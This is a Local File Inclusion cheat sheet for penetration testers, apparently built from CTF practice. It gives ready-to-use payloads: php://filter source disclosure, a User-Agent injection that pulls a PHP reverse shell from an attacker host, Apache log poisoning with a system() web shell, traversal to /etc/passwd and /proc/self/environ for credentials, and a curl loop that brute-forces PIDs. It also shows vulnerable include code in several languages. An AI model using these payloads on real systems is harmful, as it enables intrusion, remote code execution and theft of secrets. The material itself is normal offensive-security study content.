## LFI Cheatsheet
https://book.hacktricks.xyz/pentesting-web/file-inclusion
https://highon.coffee/blog/lfi-cheat-sheet/
https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet

## Tool to use
I suggest FFUF since itÂ´s easy, with Fuzzing list from **SECList/LFI**

How to get php code so you can see how LFI works
1)Test if phps(source) is available
http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.phps
2)You can Base64 encode the script which will eventually show the php script in html encoded result if is PHP server is misconfigured.
Add **php://filter/convert.base64-encode/resource=**
Before:
http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
After:
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php

## LFI to RCE
1) Easy method
```
python3 -m SimpleHTTPServer 9000 
curl "http://<victim_ip>/" -H "User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://<attacker_ip:9000/shell-php-rev.php')) ?>" 
file_put_contents('shell.php')                                // What it will be saved locally on the target
file_get_contents('http://<attacker_ip>:9000/shell-php-rev.php') // Where is the shell on YOUR pc and WHAT is it called
Execute PHP Reverse Shell: http//<victim_ip>/shell.php 
(Ofcourse you need to have a listening NC)
```
2)Longer
```
curl http//<victim_ip>/index.php?file=../../../../../../../var/log/apache2/access.log -H "User-Agent: <?php system(\$_GET['c']); ?>" 
Execute RCE: http//<victim_ip>/index.php?file=../../../../../../../var/log/apache2/access.log&c=whoami
```


# Useful /proc/[ PID ] entries 
```
    /proc/[PID]/cmdline Process invocation command with parameters.

    It potentially exposes paths, usernames and passwords.

    /proc/[PID]/environ Environment variables.

    It potentially exposes paths, usernames and passwords.

    /proc/[PID]/cwd Process' current working directory.

    /proc/[PID]/fd/[#] File descriptors.

    Contains one entry for each file which the process has open.
```


# How to determine WebPath
1)Read it from: 
```
/proc/self/environ
```
or
2)Read it from: 
```
/proc/self/cmdline
```

# PID bruteforce via LFI
```
for i in $(seq 900 1000); do curl $IP:8000/?page=../../../../proc/$i/cmdline -o -; echo "  PID => $i"; done 
```


# LFI In Other languages
In PHP, we may use the **include()** function to load a local or a remote file as we load a page. If the path passed to the include() is taken from a user-controlled parameter, like a GET parameter, and the code does not explicitly filter and sanitize the user input.
```
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```
Other dangerous functions: **include_once(), require(), require_once(), file_get_contents()**, and several others as well.

# LFI in NodeJS
Whatever parameter passed from the URL gets used by the read-file function, which then writes the file content in the HTTP response. 
```
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```
Unlike our earlier examples where GET parameters were specified after a (?) character in the URL, the above example takes the parameter from the URL path (e.g. **/about/en or /about/es**). 
As the parameter is directly used within the render() function to specify the rendered file, we can change the URL to show a different file instead.
```
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```


## LFI in Java
The following examples show how web applications for a Java web server may include local files based on the specified parameter, using the include function:
```
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```


## LFI in .NET
The **Response.WriteFile** function works very similarly to all of our earlier examples, as it takes a file path for its input and writes its content to the response.
```
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```
Practical examples:
```
Code (Absolute path): 
include($_GET['language']);
Here we can exploit with Absolute path ex language.php?=/etc/passwd
```
Code(Relative path): 
```
include("./languages/" . $_GET['language']);
Here we can't use same payload otherwise the backend would interpret lite ./languages//etc/passws
The payload would be like ../etc/passwd
```
If code is using name prefixes: 
```
include("lang_" . $_GET['language']);
If we try to traverse the directory with ../../../etc/passwd, the final string would be lang_../../../etc/passwd, which is invalid.
The trick is to append a / in front, something like: /../../../etc/passwd
```
Code (extension filtering): 
```
include($_GET['language'] . ".php");
In this case, if we try to read /etc/passwd, then the file included would be /etc/passwd.php, which does not exist
```
